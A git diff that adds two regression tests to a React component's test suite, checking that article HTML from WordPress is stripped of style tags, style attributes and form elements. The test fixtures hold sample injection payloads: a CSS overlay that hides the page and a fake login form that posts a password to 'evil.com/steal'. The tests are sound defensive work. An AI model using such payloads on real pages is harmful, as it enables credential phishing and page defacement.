@@ -146,4 +146,36 @@ describe("ArticleView", () => {
     expect(h1).toHaveFocus();
     expect(h1.getAttribute("tabindex")).toBe("-1");
   });
+
+  it("strips style tags and style attributes from content (regression #211)", () => {
+    const cssInjectionPost: WpPost = {
+      id: 211,
+      title: "CSS Injection Test",
+      content: '<style>body{display:none}</style><p style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999">overlay</p><p>Safe paragraph</p>',
+    };
+    const { container } = render(withProviders(<ArticleView post={cssInjectionPost} onBack={vi.fn()} />));
+    const articleBody = container.querySelector(".article-body");
+    expect(articleBody).toBeInTheDocument();
+    expect(articleBody!.innerHTML).not.toContain("<style");
+    expect(articleBody!.innerHTML).not.toContain("style=");
+    expect(articleBody!.innerHTML).toContain("Safe paragraph");
+  });
+
+  it("strips form and input tags from content (regression #211)", () => {
+    const formSpoofPost: WpPost = {
+      id: 212,
+      title: "Form Spoofing Test",
+      content: '<form action="https://evil.com/steal"><input type="text" name="password" placeholder="Enter password"><button type="submit">Login</button><select><option>A</option></select><textarea>notes</textarea><fieldset><legend>Info</legend></fieldset></form><p>Safe paragraph</p>',
+    };
+    const { container } = render(withProviders(<ArticleView post={formSpoofPost} onBack={vi.fn()} />));
+    const articleBody = container.querySelector(".article-body");
+    expect(articleBody).toBeInTheDocument();
+    expect(articleBody!.innerHTML).not.toContain("<form");
+    expect(articleBody!.innerHTML).not.toContain("<input");
+    expect(articleBody!.innerHTML).not.toContain("<button");
+    expect(articleBody!.innerHTML).not.toContain("<select");
+    expect(articleBody!.innerHTML).not.toContain("<textarea");
+    expect(articleBody!.innerHTML).not.toContain("<fieldset");
+    expect(articleBody!.innerHTML).toContain("Safe paragraph");
+  });
 });
